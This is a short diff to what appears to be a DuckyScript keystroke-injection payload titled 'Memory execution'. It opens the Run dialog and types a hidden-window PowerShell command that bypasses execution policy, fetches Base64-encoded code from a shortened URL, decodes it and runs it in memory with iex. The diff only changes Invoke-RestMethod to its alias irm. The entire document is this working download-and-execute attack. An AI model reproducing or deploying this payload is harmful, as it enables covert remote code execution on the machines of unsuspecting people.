@@ -4,6 +4,6 @@ REM Memory execution
 DELAY 1000
 GUI r
 DELAY 1000
-STRING powershell -NoP -W H -Ep Bypass $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-RestMethod -Uri "t.ly/2rDuD"))); iex $p
+STRING powershell -NoP -W H -Ep Bypass $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((irm -Uri "t.ly/2rDuD"))); iex $p
 DELAY 1000
 ENTER
